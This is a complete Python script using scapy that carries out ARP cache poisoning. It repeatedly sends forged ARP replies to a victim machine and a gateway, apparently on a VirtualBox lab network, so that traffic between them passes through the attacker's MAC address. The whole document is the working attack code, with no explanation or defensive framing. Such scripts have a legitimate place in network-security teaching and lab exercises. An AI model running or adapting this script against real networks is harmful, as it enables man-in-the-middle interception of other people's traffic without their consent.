from scapy.all import *
import time
ether_victim = Ether(dst="08:00:27:37:4e:f3")
arp_victim = ARP(op=2, psrc="10.0.2.2", hwsrc="08:00:27:1f:b7:23",  pdst="10.0.2.4", hwdst="08:00:27:37:4e:f3")
frame_victim = ether_victim/arp_victim
ether_gateway = Ether(dst="08:00:27:d2:d3:36")
arp_gateway = ARP(op=2, psrc="10.0.2.4", hwsrc="08:00:27:1f:b7:23", pdst="10.0.2.2", hwdst="08:00:27:d2:d3:36")
frame_gateway = ether_gateway/arp_gateway
while True:
      	sendp(frame_victim)
      	sendp(frame_gateway)
      	time.sleep(2)
